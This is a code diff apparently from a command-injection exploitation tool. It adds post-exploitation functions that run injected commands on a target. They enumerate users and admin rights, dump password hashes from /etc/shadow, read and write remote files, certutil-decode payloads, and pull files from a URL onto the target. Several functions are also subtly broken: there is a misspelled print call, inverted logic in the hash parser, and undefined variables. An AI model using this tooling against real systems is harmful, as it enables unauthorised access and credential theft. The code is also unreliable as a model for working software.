@@ -1648,12 +1648,526 @@ def generate_char_pool(num_of_chars):
   return char_pool
 
 """
+Print powershell version
+"""
+def print_ps_version(ps_version, filename, _):
+  try:
+    if float(ps_version):
+      settings.PS_ENABLED = True
+      ps_version = "".join(str(p) for p in ps_version)
+      if settings.VERBOSITY_LEVEL == 0 and _:
+        print(settings.SINGLE_WHITESPACE)
+      # Output PowerShell's version number
+      info_msg = "Powershell version: " + ps_version
+      print(settings.print_bold_info_msg(info_msg))
+      # Add infos to logs file. 
+      output_file = open(filename, "a")
+      if not menu.options.no_logging:
+        info_msg = "Powershell version: " + ps_version + "\n"
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+      output_file.close()
+  except ValueError:
+    warn_msg = "Heuristics have failed to identify the version of Powershell, "
+    warn_msg += "which means that some payloads or injection techniques may be failed." 
+    print(settings.print_warning_msg(warn_msg))
+    settings.PS_ENABLED = False
+    ps_check_failed()
+
+
+"""
+Print hostname
+"""
+def print_hostname(shell, filename, _):
+  if shell:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      print(settings.SINGLE_WHITESPACE)
+    info_msg = "Hostname: " +  str(shell)
+    print(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file. 
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      info_msg = info_msg + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
+  else:
+    warn_msg = "Heuristics have failed to identify the hostname."
+    print(settings.print_warning_msg(warn_msg))
+
+"""
+Print current user info
+"""
+def print_current_user(cu_account, filename, _):
+  if cu_account:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      print(settings.SINGLE_WHITESPACE)
+    info_msg = "Current user: " +  str(cu_account)
+    print(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.   
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      info_msg = info_msg + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
+  else:
+    warn_msg = "Heuristics have failed to fetch the current user."
+    print(settings.print_warning_msg(warn_msg))
+
+"""
+Print current user privs
+"""
+def print_current_user_privs(shell, filename, _):
+  priv = "True"
+  if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
+     (settings.TARGET_OS != "win" and shell != "0"):
+    priv = "False"
+
+  if settings.VERBOSITY_LEVEL == 0 and _:
+    print(settings.SINGLE_WHITESPACE)
+
+  info_msg = "Current user has excessive privileges: " +  str(priv)  
+  print(settings.print_bold_info_msg(info_msg))
+  # Add infos to logs file.    
+  output_file = open(filename, "a")
+  if not menu.options.no_logging:
+    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  output_file.close()
+
+"""
+Print OS info
+"""
+def print_os_info(target_os, target_arch, filename, _):
+  if target_os and target_arch:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      print(settings.SINGLE_WHITESPACE)
+    info_msg = "Operating system: " +  str(target_os) + " (" + str(target_arch) + ")"
+    print(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.   
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      info_msg = info_msg + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
+  else:
+    warn_msg = "Heuristics have failed to fetch underlying operating system information."
+    print(settings.print_warning_msg(warn_msg))
+
+
+"""
+Print users enumeration.
+"""
+def print_users(sys_users, filename, _):
+  # Windows users enumeration.
+  if settings.TARGET_OS == "win":
+    try:
+      if sys_users[0] :
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        sys.stdout.write(settings.SUCCESS_STATUS)
+        sys_users_list = re.findall(r"(.*)", sys_users)
+        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
+        sys_users_list = ' '.join(sys_users_list.split())
+        sys_users_list = sys_users_list.split()
+        if settings.VERBOSITY_LEVEL == 0 and _:
+          print(settings.SINGLE_WHITESPACE)
+        info_msg =  "Identified " + str(len(sys_users_list))
+        info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+        info_msg += " via 'net users' command."
+        print(settings.print_bold_info_msg(info_msg))
+        # Add infos to logs file.   
+        output_file = open(filename, "a")
+        if not menu.options.no_logging:
+          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+        output_file.close()
+        count = 0
+        for user in range(0, len(sys_users_list)):
+          count = count + 1
+          if menu.options.privileges:
+            cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
+            if alter_shell:
+              cmd = cmd.replace("'","\\'")
+            cmd = "cmd /c " + cmd 
+            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+            check_privs = cb_injector.injection_results(response, TAG, cmd)
+            check_privs = "".join(str(p) for p in check_privs).strip()
+            check_privs = re.findall(r"(.*)", check_privs)
+            check_privs = "".join(str(p) for p in check_privs).strip()
+            check_privs = check_privs.split()
+            if "Admin" in check_privs[0]:
+              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " admin user"
+              is_privileged_nh = " is admin user "
+            else:
+              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user"
+              is_privileged_nh = " is regular user "
+          else :
+            is_privileged = ""
+            is_privileged_nh = ""
+          print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + ".")
+          # Add infos to logs file.   
+          output_file = open(filename, "a")
+          if not menu.options.no_logging:
+            output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + sys_users_list[user] + is_privileged + "\n" )
+          output_file.close()
+      else:
+        # print(settings.SINGLE_WHITESPACE)
+        warn_msg = "It seems that you don't have permissions to enumerate users entries."
+        print(settings.print_warning_msg(warn_msg))
+    except TypeError:
+      pass
+    except IndexError:
+      # print(settings.SINGLE_WHITESPACE)
+      warn_msg = "It seems that you don't have permissions to enumerate users entries."
+      print(settings.print_warning_msg(warn_msg))
+      pass
+      
+  # Unix-like users enumeration.    
+  else:
+    try:
+      if sys_users[0] :
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        if len(sys_users.split(" ")) <= 1 :
+          sys_users = sys_users.split("\n")
+        else:
+          sys_users = sys_users.split(" ")
+        # Check for appropriate '/etc/passwd' format.
+        if len(sys_users) % 3 != 0 :
+          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
+          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
+          print(settings.print_warning_msg(warn_msg))
+          sys_users = " ".join(str(p) for p in sys_users).strip()
+          print(sys_users)
+          output_file = open(filename, "a")
+          if not menu.options.no_logging:
+            output_file.write("      " + sys_users)
+          output_file.close()
+        else:  
+          sys_users_list = []
+          for user in range(0, len(sys_users), 3):
+             sys_users_list.append(sys_users[user : user + 3])
+          if len(sys_users_list) != 0 :
+            if settings.VERBOSITY_LEVEL == 0 and _:
+              print(settings.SINGLE_WHITESPACE)
+            info_msg = "Identified " + str(len(sys_users_list)) 
+            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+            info_msg += " in '" +  settings.PASSWD_FILE + "'."
+            print(settings.print_bold_info_msg(info_msg))
+            # Add infos to logs file.   
+            output_file = open(filename, "a")
+            if not menu.options.no_logging:
+              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+            output_file.close()
+            count = 0
+            for user in range(0, len(sys_users_list)):
+              sys_users = sys_users_list[user]
+              sys_users = ":".join(str(p) for p in sys_users)
+              count = count + 1
+              fields = sys_users.split(":")
+              fields1 = "".join(str(p) for p in fields)
+              # System users privileges enumeration
+              try:
+                if not fields[2].startswith("/"):
+                  raise ValueError()
+                if menu.options.privileges:
+                  if int(fields[1]) == 0:
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
+                    is_privileged_nh = " is root user "
+                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
+                    is_privileged_nh = " is system user "
+                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
+                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
+                      is_privileged_nh = " is anonymous user "
+                    elif int(fields[1]) == 60002:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
+                      is_privileged_nh = " is non-trusted user "   
+                    else:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
+                      is_privileged_nh = " is regular user "
+                  else :
+                    is_privileged = ""
+                    is_privileged_nh = ""
+                else :
+                  is_privileged = ""
+                  is_privileged_nh = ""
+                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
+                # Add infos to logs file.   
+                output_file = open(filename, "a")
+                if not menu.options.no_logging:
+                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0] + "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                output_file.close()
+              except ValueError:
+                if count == 1 :
+                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
+                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
+                  print(settings.print_warning_msg(warn_msg))
+                sys_users = " ".join(str(p) for p in sys_users.split(":"))
+                print(sys_users) 
+                output_file = open(filename, "a")
+                if not menu.options.no_logging:
+                  output_file.write("      " + sys_users)
+                output_file.close()
+      else:
+        # print(settings.SINGLE_WHITESPACE)
+        warn_msg = "It seems that you don't have permissions to read the '" 
+        warn_msg += settings.PASSWD_FILE + "'."
+        ptint(settings.print_warning_msg(warn_msg))  
+    except TypeError:
+      pass
+    except IndexError:
+      # print(settings.SINGLE_WHITESPACE)
+      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
+      print(settings.print_warning_msg(warn_msg))
+      pass
+
+"""
+Print users enumeration.
+"""
+def print_passes(sys_passes, filename, _):
+  if sys_passes == "":
+    sys_passes = " "
+    sys_passes = sys_passes.replace(" ", "\n")
+    sys_passes = sys_passes.split()
+    if len(sys_passes) != 0 :
+      if settings.VERBOSITY_LEVEL == 0 and _:
+        print(settings.SINGLE_WHITESPACE)
+      info_msg = "Identified " + str(len(sys_passes))
+      info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+      info_msg += " in '" +  settings.SHADOW_FILE + "'."
+      print(settings.print_bold_info_msg(info_msg))
+      # Add infos to logs file.   
+      output_file = open(filename, "a")
+      if not menu.options.no_logging:
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
+      output_file.close()
+      count = 0
+      for line in sys_passes:
+        count = count + 1
+        try:
+          if ":" in line:
+            fields = line.split(":")
+            if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
+              print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
+              # Add infos to logs file.   
+              output_file = open(filename, "a")
+              if not menu.options.no_logging:
+                output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
+              output_file.close()
+        # Check for appropriate '/etc/shadow' format.
+        except IndexError:
+          if count == 1 :
+            warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
+            warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
+            print(settings.print_warning_msg(warn_msg))
+          print(fields[0])
+          output_file = open(filename, "a")
+          if not menu.options.no_logging:
+            output_file.write("      " + fields[0])
+          output_file.close()
+    else:
+      warn_msg = "It seems that you don't have permissions to read the '" 
+      warn_msg += settings.SHADOW_FILE + "' file."
+      print(settings.print_warning_msg(warn_msg))
+
+"""
+Quote provided cmd
+"""
+def quoted_cmd(cmd):
+  cmd = "\"" + cmd + "\""
+  return cmd
+
+"""
+Find filename
+"""
+def find_filename(dest_to_write, content):
+  fname = os.path.basename(dest_to_write)
+  tmp_fname = "tmp_" + fname
+  content = quoted_cmd(content)
+  cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + tmp_fname
+  return fname, tmp_fname, cmd
+
+"""
+Decode base 64 encoding
+"""
+def win_decode_b64_enc(fname, tmp_fname):
+  cmd = settings.CERTUTIL_DECODE_CMD  + tmp_fname + " " + fname
+  return cmd
+
+"""
+Remove command substitution on provided command
+"""
+def remove_command_substitution(cmd):
+  cmd = cmd.replace("echo $(","").replace(")","")
+  return cmd
+
+"""
+Write the file content
+"""
+def write_content(content, dest_to_write):
+  content = quoted_cmd(content)
+  cmd = settings.FILE_WRITE + content +  settings.FILE_WRITE_OPERATOR + dest_to_write 
+  return cmd
+
+"""
+Delete filename
+"""
+def delete_tmp(tmp_fname):
+  cmd = settings.WIN_DEL + tmp_fname
+  return cmd
+
+"""
+Check if file exists.
+"""
+def check_file(dest_to_upload):
+  if settings.TARGET_OS == "win":
+    cmd = settings.FILE_LIST_WIN + dest_to_upload
+  else:  
+    cmd = "echo $(" + settings.FILE_LIST + dest_to_upload + ")"
+  return cmd
+
+
+"""
+Change directory
+"""
+def change_dir(dest_to_write):
+  dest_to_write = dest_to_write.replace("\\","/")
+  path = os.path.dirname(dest_to_write)
+  path = path.replace("/","\\")
+  cmd = "cd " + path 
+  return cmd
+
+"""
+File content to read.
+"""
+def file_content_to_read():
+  file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
+  info_msg = "Fetching content of the file: '"  
+  info_msg += file_to_read + "'."
+  print(settings.print_info_msg(info_msg))
+  if settings.TARGET_OS == "win":
+    cmd = settings.WIN_FILE_READ + file_to_read
+  else:
+    if settings.EVAL_BASED_STATE:
+      cmd = "(" + settings.FILE_READ + file_to_read + ")"
+    else:
+      cmd = settings.FILE_READ + file_to_read
+  return cmd, file_to_read
+
+"""
+File read status
+"""
+def file_read_status(shell, file_to_read, filename):
+  if shell:
+    _ = "Fetched file content"
+    print(settings.print_retrieved_data(_, shell))
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      info_msg = "Extracted content of the file '"
+      info_msg += file_to_read + "' : " + shell + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
+  else:
+    warn_msg = "It seems that you don't have permissions "
+    warn_msg += "to read the content of the file '" + file_to_read + "'."
+    print(settings.print_warning_msg(warn_msg))
+
+"""
+Check upload/write destination
+"""
+def check_destination(destination):
+  if menu.options.file_write:
+    where = menu.options.file_write
+  else:
+    where = menu.options.file_upload
+  if os.path.split(destination)[1] == "" :
+    _ = os.path.split(destination)[0] + "/" + os.path.split(where)[1]
+  elif os.path.split(destination)[0] == "/":
+    _ = "/" + os.path.split(destination)[1] + "/" + os.path.split(where)[1]
+  elif os.path.split(destination)[0] == "\\":
+    _ = "\\" + os.path.split(destination)[1] + "\\" + os.path.split(where)[1]
+  else:
+    _ = destination
+  return _
+
+"""
+Write the content of the file
+"""
+def check_file_to_write():
+  file_to_write = menu.options.file_write.encode(settings.DEFAULT_CODEC).decode()
+  if not os.path.exists(file_to_write):
+    err_msg = "It seems that the provided local file '" + file_to_write + "' does not exist."
+    print(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+  if os.path.isfile(file_to_write):
+    with open(file_to_write, 'r') as content_file:
+      content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
+    content = "".join(str(p) for p in content).replace("'", "\"")
+    if settings.TARGET_OS == "win":
+      import base64
+      content = base64.b64encode(content.encode(settings.DEFAULT_CODEC)).decode()
+  else:
+    warn_msg = "It seems that '" + file_to_write + "' is not a file."
+    print(settings.print_warning_msg(warn_msg))
+    print(settings.SINGLE_WHITESPACE)
+
+  dest_to_write = check_destination(destination=menu.options.file_dest)
+  info_msg = "Trying to write the content of the file '"  
+  info_msg += file_to_write + "' on a remote directory '" + dest_to_write + "'."
+  print(settings.print_info_msg(info_msg))
+  return file_to_write, dest_to_write, content
+
+"""
+File write status
+"""
+def file_write_status(shell, dest_to_write):
+  if shell:
+    info_msg = "The file has been successfully created on remote directory: '" + dest_to_write + "'." 
+    print(settings.print_bold_info_msg(info_msg))
+  else:
+    warn_msg = "It seems that you don't have permissions to write files on the remote directory '" + dest_to_write + "'."
+    print(settings.print_warning_msg(warn_msg))
+
+"""
+File upload procedure.
+"""
+def check_file_to_upload():
+  file_to_upload = menu.options.file_upload.encode(settings.DEFAULT_CODEC).decode()
+  try:
+    _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
+  except _urllib.error.HTTPError as err_msg:
+    warn_msg = "It seems that the '" + file_to_upload + "' file, does not exist. (" +str(err_msg)+ ")"
+    print(settings.print_warning_msg(warn_msg))
+    raise SystemExit()
+  except ValueError as err_msg:
+    err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
+    print(settings.print_critical_msg(err_msg))
+    raise SystemExit() 
+  dest_to_upload = check_destination(destination=menu.options.file_dest)
+  info_msg = "Trying to upload the file from '"  
+  info_msg += file_to_upload + "' on a remote directory '" + dest_to_upload + "'."
+  print(settings.print_info_msg(info_msg))
+  # Execute command
+  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
+  return cmd, dest_to_upload
+
+"""
+File upload status.
+"""
+def file_upload_status(shell, dest_to_upload):
+  if shell:
+    info_msg = "The file has been successfully uploaded on remote directory '" + dest_to_upload + "'."
+    print(settings.print_bold_info_msg(info_msg))
+  else:
+    warn_msg = "It seems that you don't have permissions to upload files on the remote directory '" + dest_to_upload + "'."
+    print(settings.print_warning_msg(warn_msg))
+
+"""
 Check if defined "--file-upload" option.
 """
 def file_upload():
   if not re.match(settings.VALID_URL_FORMAT, menu.options.file_upload):
-    if not menu.options.file_dest.endswith("/"):
-      menu.options.file_dest = menu.options.file_dest + "/"
+    # if not menu.options.file_dest.endswith("/"):
+    #   menu.options.file_dest = menu.options.file_dest + "/"
     # Check if not defined URL for upload.
     while True:
       message = "Do you want to enable an HTTP server? [Y/n] > "
